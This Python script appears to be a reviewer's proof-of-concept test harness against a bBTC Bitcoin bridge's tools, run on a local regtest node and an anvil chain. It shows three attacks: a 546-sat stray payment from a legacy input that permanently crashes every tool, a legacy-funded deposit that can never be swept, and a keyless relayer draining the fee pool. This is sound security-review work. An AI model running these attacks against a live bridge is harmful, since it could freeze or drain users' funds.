#!/usr/bin/env python3
"""Reviewer 325 (round 16): attacks on the bBTC tools at 7b13bdb, on Bitcoin Core regtest + anvil. UNAUDITED test code.

  python3 review_r16_attacks.py --case stray|legacy-deposit|pool-drain|full-std --bitcoin-bin DIR --artifact TOKEN.json
                                --work DIR --btc-port P --l2-port P

It reuses the developer's rig (rehearse_regtest.Rig) and the same set-up, with one change: bitcoind runs with
`-acceptnonstdtxn=0` (regtest accepts non-standard transactions by default; mainnet relay does not).
A line `DEMONSTRATED ...` is an attack that worked; `NOT REPRODUCED ...` one that did not. Exit 0 either way.
"""
import json
import os
from pathlib import Path
import secrets
import subprocess
import sys
import time

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE))
import btc_core as c  # noqa: E402
import btc_policy as pol  # noqa: E402
import rehearse_regtest as rr  # noqa: E402

opt, sh = rr.opt, rr.sh


def say(ok, text, detail=''):
    print(('DEMONSTRATED ' if ok else 'NOT REPRODUCED ') + text + (f'\n     {detail}' if detail else ''), flush=True)


def note(text):
    print('     ' + str(text), flush=True)


class Rig(rr.Rig):
    def start_bitcoind(self):
        log = open(self.work / 'bitcoind.log', 'wb')
        self.procs.append(subprocess.Popen([
            str(self.bin / 'bitcoind'), '-regtest', f'-datadir={self.data}', f'-rpcport={self.btc_port}', '-server=1',
            '-listen=0', '-connect=0', '-dnsseed=0', '-fixedseeds=0', '-discover=0', '-listenonion=0',
            '-rpcbind=127.0.0.1', '-rpcallowip=127.0.0.1', '-txindex=1', '-fallbackfee=0.0002', '-dbcache=64',
            '-acceptnonstdtxn=0', '-printtoconsole=0'], stdout=log, stderr=log))
        for _ in range(150):
            if self.cookie.exists() and self.bcli('getblockchaininfo', ok=False).returncode == 0:
                break
            time.sleep(0.2)
        else:
            raise SystemExit('bitcoind did not start')
        for _ in range(100):
            if json.loads(self.bcli('getindexinfo').stdout).get('txindex', {}).get('synced'):
                break
            time.sleep(0.2)

    def tool_raw(self, script, cfg, *args):
        done = sh(sys.executable, HERE / script, '--config', cfg, *args, ok=False)
        return done.returncode, done.stdout[-600:], done.stderr[-6000:]

    def legacy_pay(self, address, sats, first=True):
        """A payment whose only input is a P2PKH output (non-empty scriptSig), the destination at vout 0 or 1."""
        legacy = self.b('getnewaddress', '', 'legacy')
        funding = self.b('sendtoaddress', legacy, '0.05000000')
        self.mine(1)
        raw = self.b('getrawtransaction', funding, 1)
        vout = next(o['n'] for o in raw['vout'] if o['scriptPubKey'].get('address') == legacy)
        change = self.b('getnewaddress', '', 'bech32')
        outs = [{address: '%.8f' % (sats / 1e8)}, {change: '%.8f' % ((5_000_000 - sats - 2_000) / 1e8)}]
        tx = self.b('createrawtransaction', json.dumps([{'txid': funding, 'vout': vout}]), json.dumps(outs if first else outs[::-1]))
        signed = self.b('signrawtransactionwithwallet', tx)
        assert signed['complete']
        txid = self.b('sendrawtransaction', signed['hex'])
        return txid, 0 if first else 1


def setup(rig):
    """The developer's set-up (rehearse_regtest.run, 'setup' part), mainnet-like policy except depths."""
    art = json.loads(Path(opt('--artifact')).read_text())
    assert c.keccak256(bytes.fromhex(art['bytecode']['object'][2:])).hex() == rr.FROZEN_CREATION
    rig.start_bitcoind()
    rig.bcli('createwallet', 'user')
    rig.miner = rig.b('getnewaddress', '', 'bech32')
    rig.b('generatetoaddress', 110, rig.miner)
    rig.start_anvil()
    deployer, alice_k, bob_k, g1, g2, g3, erin_k, mallory_k = rr.ANVIL_KEYS
    rig.alice, rig.bob = rig.addr(alice_k), rig.addr(bob_k)
    guardians = [rig.addr(k) for k in (g1, g2, g3)]
    keys_dir = rig.work / 'keys'
    keys_dir.mkdir(mode=0o700, exist_ok=True)
    pubs, addrs = [], []
    for i in range(7):
        k = secrets.token_bytes(32)
        pubs.append(c.pubkey(int.from_bytes(k, 'big')))
        addrs.append(c.eth_address(pubs[-1]))
        (keys_dir / f'pw{i}').write_text(f'throwaway-{i}')
        os.chmod(keys_dir / f'pw{i}', 0o600)
        sh(rig.cast, 'wallet', 'import', f'signer{i}', '--private-key', '0x' + k.hex(), '--keystore-dir', keys_dir,
           '--unsafe-password', f'throwaway-{i}')
    owner = c.address_from_spk('bitcoin-regtest', c.spk_from_address('bitcoin-mainnet', rr.OWNER_MAINNET))
    policy = {**pol.DEFAULT_POLICY, 'sweepDepth': 1, 'minConfirmations': 3, 'windowLimitSats': 10_000_000,
              'largeReleaseSats': 5_000_000}
    thread_address = c.address_from_spk('bitcoin-regtest', c.p2wsh(c.multisig_script(5, pubs)))
    a_txid, a_vout, a_value = rig.pay(thread_address, '0.00250000')
    rig.mine(1)
    vault_cfg = {'network': 'bitcoin-regtest', 'threshold': 5, 'keys': [p.hex() for p in pubs],
                 'anchor': {'txid': a_txid, 'vout': a_vout}, 'owner_address': owner, 'policy': policy}
    vault_path = rig.work / 'vault.json'
    vault_path.write_text(json.dumps(vault_cfg, indent=1))
    vault = pol.Vault.from_config(vault_cfg)
    token_cfg = {'token': {'name': 'Bloch Bridged Bitcoin', 'symbol': 'bBTC'},
                 'signers': {'threshold': 5, 'set': addrs},
                 'guardians': {'set': guardians, 'pauseDuration': 259200, 'pauseCooldown': 259200},
                 'mintSwitch': {'threshold': 6, 'delay': 1209600},
                 'limits': {'supplyCap': 1_000_000, 'bucketCapacity': 100_000, 'refillPerSecond': 1,
                            'largeMintThreshold': 0, 'largeMintDelay': 43200, 'minBurn': 500}}
    token_path = rig.work / 'token.json'
    token_path.write_text(json.dumps(token_cfg, indent=1))
    rc, planned = rig.tool('btc_deploy.py', str(vault_path), 'token', '--token-config', str(token_path), '--artifact',
                           opt('--artifact'), '--out', str(rig.work / 'token.initcode'))
    assert rc == 0, planned
    init_code = (rig.work / 'token.initcode').read_text().strip()
    dep = json.loads(sh(rig.cast, 'send', '--rpc-url', rig.l2, '--private-key', deployer, '--json', '--create', init_code).stdout)
    rig.token = dep['contractAddress'].lower()
    runtime = sh(rig.cast, 'code', rig.token, '--rpc-url', rig.l2).stdout.strip()
    code_keccak = '0x' + c.keccak256(bytes.fromhex(runtime[2:])).hex()
    rig.mint_cfg, rig.half_cfg, rig.signer_cfg = [], [], []
    for i in range(7):
        half = rig.work / f'half{i}.json'
        half.write_text(json.dumps({'vault': str(vault_path), 'btc_rpc': rig.btc_url, 'btc_cookie': str(rig.cookie),
                                    'l2_rpc': rig.l2, 'token': rig.token, 'l2_chain_id': rr.L2_CHAIN,
                                    'token_code_keccak': code_keccak, 'journal': str(rig.work / f'half{i}.journal.json')}))
        mint = rig.work / f'mint{i}.json'
        mint.write_text(json.dumps({
            'l2_rpc': rig.l2, 'l2_chain_id': rr.L2_CHAIN, 'token': rig.token, 'token_code_keccak': code_keccak,
            'source_chain_id': vault.chain_id, 'source_vault': '0x' + vault.source_vault.hex(),
            'source_route': '0x' + vault.route.hex(), 'threshold': 5, 'provenance': True, 'l2_source': 'rpc',
            'db': str(rig.work / f'mint{i}.db.json'), 'keystore': str(keys_dir / f'signer{i}'),
            'password_file': str(keys_dir / f'pw{i}'), 'cast': rig.cast,
            'eth_half_deposit': [sys.executable, str(HERE / 'btc_half.py'), '--config', str(half), 'deposit',
                                 '--deposit-id', '{deposit_id}']}))
        signer = rig.work / f'signer{i}.json'
        signer.write_text(json.dumps({'vault': str(vault_path), 'btc_rpc': rig.btc_url, 'btc_cookie': str(rig.cookie),
                                      'signatario_config': str(mint), 'keystore': str(keys_dir / f'signer{i}'),
                                      'password_file': str(keys_dir / f'pw{i}'), 'pubkey': pubs[i].hex(),
                                      'journal': str(rig.work / f'signer{i}.journal.json'), 'cast': rig.cast,
                                      'feerate_ceiling': 30}))
        rig.mint_cfg.append(str(mint))
        rig.half_cfg.append(str(half))
        rig.signer_cfg.append(str(signer))
    rig.relay_cfg = str(rig.work / 'relay.json')
    Path(rig.relay_cfg).write_text(json.dumps({'vault': str(vault_path), 'btc_rpc': rig.btc_url, 'btc_cookie': str(rig.cookie),
                                               'l2_rpc': rig.l2, 'token': rig.token, 'token_from_block': 0}))
    rig.advance(60)
    return vault


def dep_addr(rig, who):
    return rig.tool('btc_relay.py', rig.relay_cfg, 'address', '--recipient', who)[1]['deposit_address']


def all_tools_dead(rig, proposal=None):
    """(every tool exits with an uncaught exception, the lines)"""
    lines, dead = [], True
    runs = [('btc_half.py status', 'btc_half.py', rig.half_cfg[0], ['status']),
            ('btc_reservas.py check', 'btc_reservas.py', rig.relay_cfg, ['check']),
            ('btc_relay.py burns', 'btc_relay.py', rig.relay_cfg, ['burns'])]
    if proposal:
        runs += [(f'btc_signer.py sign (signer {i})', 'btc_signer.py', rig.signer_cfg[i],
                  ['sign', '--proposal', str(proposal), '--out', str(rig.work / f'dead{i}.json')]) for i in range(7)]
    rig.sync_index()
    for name, script, cfg, args in runs:
        rc, out, err = rig.tool_raw(script, cfg, *args)
        crashed = rc != 0 and 'Traceback (most recent call last)' in err and 'empty scriptSigs' in err
        dead = dead and crashed
        lines.append(f"{name}: rc {rc}, {'uncaught ' + err.strip().splitlines()[-1] if crashed else (out.strip()[:200] or err.strip()[-200:])}")
    return dead, lines


def case_stray(rig, vault):
    alice, bob = rig.alice, rig.bob
    d1 = rig.pay(dep_addr(rig, alice), '0.05000000')
    rig.mine(1)
    r = rig.vault_tx(2, deposits=[(d1[0], d1[1], alice)], tag='s-sweep1')
    ok = bool(r['combine']) and r['combine'][0] == 0
    say(ok, 'baseline (and standardness): with -acceptnonstdtxn=0 the sweep of a segwit-funded deposit is signed by 5 and accepted',
        '' if ok else str(r)[:900])
    rig.mine(1)
    st = rig.status()
    note(f"healthy vault before the attack: tip {st.get('tip')}, deposits {len(st.get('deposits', []))}")
    d2 = rig.pay(dep_addr(rig, bob), '0.03000000')
    rig.mine(1)
    r2 = rig.vault_tx(2, deposits=[(d2[0], d2[1], bob)], signers=[], tag='s-sweep2')  # proposal only
    assert r2['propose'][0] == 0, r2['propose']
    # the attack: anyone, 546 sat to the public thread address at vout 0, paid from a legacy (P2PKH) input
    txid, vout = rig.legacy_pay(vault.thread_address(), 546, first=True)
    rig.mine(1)
    note(f'attacker paid 546 sat to {vault.thread_address()} in {txid}:{vout} (one P2PKH input)')
    dead, lines = all_tools_dead(rig, r2['proposal'])
    for line in lines:
        note(line)
    say(dead, 'R325-BTC-1 (a): one 546-sat stray from a legacy input stops the reserves monitor, the deposit half, the relayer '
              'and all 7 vault signers with an uncaught ValueError; no vault transaction can be signed any more')
    rig.mine(20)
    dead2, _ = all_tools_dead(rig)
    say(dead2, 'R325-BTC-1 (a): the stop is permanent (20 blocks later the tools still crash; the stray cannot be swept because '
               'sweeping it needs the same tools)')


def case_legacy_deposit(rig, vault):
    alice = rig.alice
    txid, vout = rig.legacy_pay(dep_addr(rig, alice), 1_000_000, first=False)
    rig.mine(1)
    note(f'an honest user paid 0.01 BTC to their deposit address from a legacy (P2PKH) wallet: {txid}:{vout}')
    r = rig.vault_tx(2, deposits=[(txid, vout, alice)], tag='l-sweep')
    signed = sum(1 for rc, _ in r['signs'] if rc == 0)
    comb = r['combine']
    note(f"propose rc {r['propose'][0]}, signers that signed: {signed}, combine: {str(comb)[:400]}")
    crashed = signed >= 5 and comb is not None and comb[0] != 0 and 'empty scriptSigs' in str(comb[1])
    say(crashed, 'R325-BTC-1 (b): 5 signers sign the sweep of a legacy-funded deposit, then `btc_relay.py combine` dies on the '
                 'deposit parent: with the shipped tools this deposit can never be swept or credited (stuck, no refund rule)')
    if signed < 5:
        return
    # anyone holding the five partials (they are not secret) assembles the witness by hand and broadcasts
    proposal = json.loads(Path(r['proposal']).read_text())
    tx, *_ = c.parse_tx(bytes.fromhex(proposal['tx']))
    scripts = [vault.thread_script, vault.deposit_script(bytes.fromhex(alice[2:]))]
    by_key = {}
    for i in range(5):
        part = json.loads((rig.work / f'l-sweep.partial{i}.json').read_text())
        by_key[bytes.fromhex(part['pubkey'])] = [c.der_sig(*c.parse_rsv(bytes.fromhex(s))[:2]) for s in part['signatures']]
    chosen = [k for k in vault.keys if k in by_key][:5]
    tx.witnesses = [[b''] + [by_key[k][i] for k in chosen] + [scripts[i]] for i in range(len(tx.inputs))]
    sent = rig.bcli('sendrawtransaction', tx.serialize().hex(), ok=False)
    note(f'hand-assembled sweep broadcast: rc {sent.returncode} {sent.stdout.strip() or sent.stderr.strip()[-200:]}')
    dead_pending, lines = all_tools_dead(rig)
    for line in lines:
        note('(sweep in the mempool) ' + line)
    rig.mine(8)
    dead, lines = all_tools_dead(rig)
    for line in lines:
        note('(sweep 8 blocks deep) ' + line)
    say(sent.returncode == 0 and dead, 'R325-BTC-1 (b): once that sweep is in the thread every tool crashes for good: the thread '
        'itself now contains a parent the parser refuses, so the stop cannot be undone by any vault transaction')


def case_pool_drain(rig, vault):
    def pool():
        st = rig.status()
        m = st['marker']
        value = int(round(float(rig.b('gettxout', st['tip'], 0 if st['tip'] != vault.anchor[0] else vault.anchor[1])['value']) * 1e8))
        return value - m['liabilities'] - m['owner_due'], m['owner_due'], value
    p0, due0, v0 = pool()
    note(f'start: thread {v0} sat, fee pool {p0} sat (the anchor), owner due {due0}')
    spent, rounds, owner_paid, last = 0, 0, 0, None
    for n in range(40):
        s_txid, s_vout, s_value = rig.pay(vault.thread_address(), '0.00000546')
        rig.mine(1)
        r = rig.vault_tx(30, donations=[(s_txid, s_vout)], tag=f'p-drain{n}')
        if r['propose'][0] != 0:
            last = r['propose'][1].get('reason')
            break
        if not r['combine'] or r['combine'][0] != 0:
            last = str(r)[:600]
            break
        rounds += 1
        spent += 546
        owner_paid += r['propose'][1]['owner_paid']
        rig.mine(1)
    p1, due1, v1 = pool()
    note(f'after {rounds} stray-only transactions at 30 sat/vB (each signed by 5 signers): thread {v1} sat, fee pool {p1} sat, '
         f'owner due {due1}, owner was paid {owner_paid} sat; the relayer put in {spent} sat of strays; stopped by: {last}')
    burned = (p0 + spent) - p1 - owner_paid - (due1 - due0)
    say(rounds > 0 and burned > 100_000, f'R325-BTC-3: a relayer with no key moved {burned} sat of the fee pool to miners with '
        f'{rounds} stray-only transactions the signers accepted at their fixed 30 sat/vB ceiling (node estimate: none / 1 sat/vB market)')


def main():
    if opt('--case') == 'full-std':  # the developer's whole rehearsal, unchanged, on a node that refuses non-standard transactions
        rr.Rig = Rig
        return rr.main()
    rig = Rig()
    try:
        vault = setup(rig)
        {'stray': case_stray, 'legacy-deposit': case_legacy_deposit, 'pool-drain': case_pool_drain}[opt('--case')](rig, vault)
    finally:
        rig.stop()


if __name__ == '__main__':
    main()
